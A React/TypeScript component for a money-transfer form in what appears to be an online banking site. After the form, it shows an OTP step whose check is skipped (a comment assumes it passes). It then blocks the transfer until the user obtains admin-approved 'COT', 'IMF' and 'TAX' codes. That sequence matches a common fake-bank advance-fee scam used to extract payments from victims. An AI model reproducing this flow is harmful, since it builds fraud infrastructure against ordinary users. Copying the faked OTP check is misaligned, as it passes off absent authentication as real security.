import React, { useState, useEffect } from 'react';
import { Card, Button, Input, Label } from '@/components/ui';
import { useTransferStore } from '@/stores/transferStore';
import { useWalletStore } from '@/stores/walletStore';
import { Modal } from '@/components/common/Modal';
import { transferApi } from '@/lib/api/transfers';

interface LocalTransferFormProps {
  onSuccess?: () => void;
}

type CodeType = 'COT' | 'IMF' | 'TAX';

const LocalTransferForm: React.FC<LocalTransferFormProps> = ({ onSuccess }) => {
  const { initiateTransfer, loading, error } = useTransferStore();
  const { wallet } = useWalletStore();
  const [formData, setFormData] = useState({
    recipientAccountNumber: '',
    recipientName: '',
    amount: '',
    description: '',
  });
  const [validationError, setValidationError] = useState('');
  
  // OTP and Code flow states
  const [showOtpModal, setShowOtpModal] = useState(false);
  const [otpCode, setOtpCode] = useState('');
  const [otpId, setOtpId] = useState<string | null>(null);
  const [showCodeModal, setShowCodeModal] = useState(false);
  const [currentCodeType, setCurrentCodeType] = useState<CodeType | null>(null);
  const [codeInput, setCodeInput] = useState('');
  const [codeRequestLoading, setCodeRequestLoading] = useState(false);
  const [verifiedCodes, setVerifiedCodes] = useState<Set<CodeType>>(new Set());
  const [pendingTransferData, setPendingTransferData] = useState<any>(null);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
    setValidationError('');
  };

  const validateForm = (): boolean => {
    if (!formData.recipientAccountNumber.trim()) {
      setValidationError('Recipient account number is required');
      return false;
    }
    if (!formData.recipientName.trim()) {
      setValidationError('Recipient name is required');
      return false;
    }
    if (!formData.amount || parseFloat(formData.amount) <= 0) {
      setValidationError('Amount must be greater than 0');
      return false;
    }
    if (wallet && parseFloat(formData.amount) > wallet.balance) {
      setValidationError('Insufficient balance');
      return false;
    }
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;

    // Store transfer data and show OTP modal
    setPendingTransferData({
      recipientAccountNumber: formData.recipientAccountNumber,
      recipientName: formData.recipientName,
      amount: parseFloat(formData.amount),
      description: formData.description,
      transferType: 'LOCAL',
    });
    setShowOtpModal(true);
  };

  const handleOtpSubmit = async () => {
    if (!otpCode || otpCode.length !== 6) {
      setValidationError('Please enter a valid 6-digit OTP');
      return;
    }

    try {
      // Verify OTP (you'll need to implement OTP verification API)
      // For now, assuming OTP is verified, check if codes are required
      const codesStatus = await transferApi.getCodesStatus();
      
      setShowOtpModal(false);
      setOtpCode('');
      
      if (codesStatus.required) {
        // Start the code verification flow
        const requiredCodes: CodeType[] = ['COT', 'IMF', 'TAX'];
        const firstUnverified = requiredCodes.find(type => 
          !codesStatus.status[type]?.isVerified
        );
        
        if (firstUnverified) {
          setCurrentCodeType(firstUnverified);
          setShowCodeModal(true);
        } else {
          // All codes verified, complete transfer
          await completeTransfer();
        }
      } else {
        // No codes required, complete transfer
        await completeTransfer();
      }
    } catch (err) {
      console.error('OTP verification failed:', err);
      setValidationError('OTP verification failed. Please try again.');
    }
  };

  const handleCodeRequest = async () => {
    if (!currentCodeType) return;
    
    setCodeRequestLoading(true);
    try {
      await transferApi.requestCode(currentCodeType);
      alert(`${currentCodeType} code request sent. Admin will approve shortly.`);
    } catch (err) {
      console.error('Code request failed:', err);
      setValidationError(`Failed to request ${currentCodeType} code`);
    } finally {
      setCodeRequestLoading(false);
    }
  };

  const handleCodeVerify = async () => {
    if (!currentCodeType || !codeInput) {
      setValidationError('Please enter the code');
      return;
    }

    try {
      const result = await transferApi.verifyCode(currentCodeType, codeInput);
      
      if (result.verified) {
        // Mark this code as verified
        const newVerified = new Set(verifiedCodes);
        newVerified.add(currentCodeType);
        setVerifiedCodes(newVerified);
        setCodeInput('');
        
        // Move to next code or complete transfer
        const allCodes: CodeType[] = ['COT', 'IMF', 'TAX'];
        const nextCode = allCodes.find(type => !newVerified.has(type));
        
        if (nextCode) {
          setCurrentCodeType(nextCode);
        } else {
          // All codes verified
          setShowCodeModal(false);
          await completeTransfer();
        }
      } else {
        setValidationError('Invalid code. Please try again.');
      }
    } catch (err) {
      console.error('Code verification failed:', err);
      setValidationError('Code verification failed. Please try again.');
    }
  };

  const completeTransfer = async () => {
    if (!pendingTransferData) return;
    
    try {
      await initiateTransfer(pendingTransferData);
      setPendingTransferData(null);
      setVerifiedCodes(new Set());
      onSuccess?.();
    } catch (err) {
      console.error('Transfer failed:', err);
    }
  };

  return (
    <>
      <form onSubmit={handleSubmit} className="space-y-4">
        {/* Recipient Account Number */}
        <div>
          <Label htmlFor="recipientAccountNumber" className="block text-sm font-medium text-gray-700 dark:text-gray-300">
            Account Number
          </Label>
          <Input
            id="recipientAccountNumber"
            name="recipientAccountNumber"
            type="text"
            placeholder="Enter account number"
            value={formData.recipientAccountNumber}
            onChange={handleInputChange}
            className="mt-1 w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
        </div>

        {/* Recipient Name */}
        <div>
          <Label htmlFor="recipientName" className="block text-sm font-medium text-gray-700 dark:text-gray-300">
            Recipient Name
          </Label>
          <Input
            id="recipientName"
            name="recipientName"
            type="text"
            placeholder="Enter recipient name"
            value={formData.recipientName}
            onChange={handleInputChange}
            className="mt-1 w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
        </div>

        {/* Amount */}
        <div>
          <Label htmlFor="amount" className="block text-sm font-medium text-gray-700 dark:text-gray-300">
            Amount (NGN)
          </Label>
          <Input
            id="amount"
            name="amount"
            type="number"
            placeholder="0.00"
            value={formData.amount}
            onChange={handleInputChange}
            step="0.01"
            min="0"
            className="mt-1 w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
          {wallet && (
            <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
              Available balance: ₦{wallet.balance?.toFixed(2)}
            </p>
          )}
        </div>

        {/* Description */}
        <div>
          <Label htmlFor="description" className="block text-sm font-medium text-gray-700 dark:text-gray-300">
            Description (Optional)
          </Label>
          <textarea
            id="description"
            name="description"
            placeholder="Transfer description"
            value={formData.description}
            onChange={handleInputChange}
            rows={2}
            className="mt-1 w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 resize-none"
          />
        </div>

        {/* Errors */}
        {(validationError || error) && (
          <div className="bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg p-3">
            <p className="text-sm text-red-700 dark:text-red-400">{validationError || error}</p>
          </div>
        )}

        {/* Submit Button */}
        <Button
          type="submit"
          disabled={loading}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 rounded-lg disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {loading ? 'Processing...' : 'Send Transfer'}
        </Button>
      </form>

      {/* OTP Modal */}
      {showOtpModal && (
        <Modal
          isOpen={showOtpModal}
          title="Verify OTP"
          onClose={() => setShowOtpModal(false)}
          size="sm"
        >
          <div className="space-y-4">
            <p className="text-sm text-gray-600 dark:text-gray-400">
              Enter the 6-digit code sent to your email
            </p>
            <Input
              type="text"
              placeholder="000000"
              value={otpCode}
              onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
              maxLength={6}
              className="text-center text-2xl tracking-widest"
            />
            <Button
              onClick={handleOtpSubmit}
              disabled={otpCode.length !== 6}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white"
            >
              Verify OTP
            </Button>
          </div>
        </Modal>
      )}

      {/* COT/IMF/TAX Code Modal */}
      {showCodeModal && currentCodeType && (
        <Modal
          isOpen={showCodeModal}
          title={`Enter ${currentCodeType} Code`}
          onClose={() => setShowCodeModal(false)}
          size="sm"
        >
          <div className="space-y-4">
            <div className="bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg p-4">
              <p className="text-sm text-yellow-800 dark:text-yellow-300">
                {currentCodeType === 'COT' && 'Cost of Transfer (COT) code is required to proceed.'}
                {currentCodeType === 'IMF' && 'International Monetary Fund (IMF) code is required.'}
                {currentCodeType === 'TAX' && 'Tax clearance code is required to complete transfer.'}
              </p>
            </div>
            
            <div>
              <Label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                {currentCodeType} Code
              </Label>
              <Input
                type="text"
                placeholder="Enter code"
                value={codeInput}
                onChange={(e) => setCodeInput(e.target.value)}
                className="w-full"
              />
            </div>

            {validationError && (
              <div className="bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg p-3">
                <p className="text-sm text-red-700 dark:text-red-400">{validationError}</p>
              </div>
            )}

            <div className="flex gap-3">
              <Button
                onClick={handleCodeRequest}
                disabled={codeRequestLoading}
                variant="outline"
                className="flex-1"
              >
                {codeRequestLoading ? 'Requesting...' : 'Request Code'}
              </Button>
              <Button
                onClick={handleCodeVerify}
                disabled={!codeInput}
                className="flex-1 bg-blue-600 hover:bg-blue-700 text-white"
              >
                Verify
              </Button>
            </div>
            
            <p className="text-xs text-gray-500 dark:text-gray-400 text-center">
              Verified: {Array.from(verifiedCodes).join(', ') || 'None'}
            </p>
          </div>
        </Modal>
      )}
    </>
  );
};

export default LocalTransferForm;
